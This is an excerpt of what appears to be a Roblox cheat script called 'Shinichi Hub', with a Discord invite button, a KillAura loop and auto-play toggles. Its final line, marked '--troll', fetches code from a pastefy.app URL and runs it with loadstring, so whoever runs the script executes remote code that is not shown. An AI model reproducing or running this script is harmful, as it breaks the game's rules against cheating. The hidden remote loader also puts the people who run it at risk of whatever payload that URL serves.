...
if currentTime - lastNotificationTime >= notificationCooldown then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Shinichi Hub",
	    Text = "Loading...",
	    Icon = "rbxthumb://type=Asset&id=78774998900413&w=150&h=150",
	    Duration = 10
    })
...
Main:AddButton({
    ...
    Callback = function()
        pcall(function()
            setclipboard("https://discord.gg/CVUprRnza9")
        end)
    end
})
Main:AddParagraph({
...
spawn(function()
    while wait() do
        if getgenv().KillAura and World3 then
            pcall(function()
...
Toggle = Race:AddToggle("Toggle", {Title = "Auto Draco V4 (Aprils Fools)", Default = false })
Toggle:OnChanged(function(Value)
    getgenv().AutoDraco = Value
end)
...
Button.Image = "rbxassetid://78774998900413"
...
--troll
loadstring(game:HttpGet("https://pastefy.app/xarFhTbB/raw"))()